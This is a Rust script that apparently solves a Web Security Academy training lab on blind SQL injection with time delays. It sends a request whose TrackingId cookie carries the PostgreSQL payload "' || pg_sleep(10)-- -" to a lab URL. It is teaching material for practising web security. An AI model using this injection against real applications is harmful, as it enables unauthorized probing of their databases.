/***************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 23/9/2023
*
* Lab: Blind SQL injection with time delays
*
* Steps: 1. Inject payload into 'TrackingId' cookie to cause a 10 seconds delay
*        2. Wait for the response
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a30002e035422da80b4e42c000f0043.web-security-academy.net";
    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "[#] Injection point:".blue(),
        "TrackingId".yellow(),
    );

    // payload to make a 10 seconds delay
    let payload = "' || pg_sleep(10)-- -";

    print!(
        "\n{}{}",
        "1. Injecting payload to cause a 10 seconds delay.. ".white(),
        "OK".green()
    );
    print!("\n{}", "2. Waiting for the response.. ".white());
    io::stdout().flush();
    // fetch the page with the injected payload
    let make_delay = client
        .get(format!("{url}/filter?category=Pets"))
        .header("Cookie", format!("TrackingId={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to make a delay with the injected payload".red()
        ));
    println!("{}", "OK".green());

    println!(
        "{} {}",
        "[#] Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(20))
        .build()
        .unwrap()
}
